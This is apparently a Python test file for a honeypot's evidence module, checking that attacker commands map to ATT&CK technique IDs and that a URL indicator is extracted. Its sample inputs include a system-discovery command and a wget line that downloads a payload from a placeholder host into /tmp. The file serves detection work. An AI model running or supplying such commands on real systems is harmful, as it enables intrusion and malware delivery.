from adaptive_honey.evidence import extract_indicators, map_techniques


def test_contextual_attack_mapping():
    mapped=map_techniques("uname -a && find /opt -type f","evt",0)
    assert {item.technique_id for item in mapped}>={"T1082","T1083","T1059.004"}


def test_ioc_extraction():
    found=extract_indicators("wget https://drop.example/payload -O /tmp/x","evt")
    assert any(item.kind=="url" and item.value.startswith("https://") for item in found)

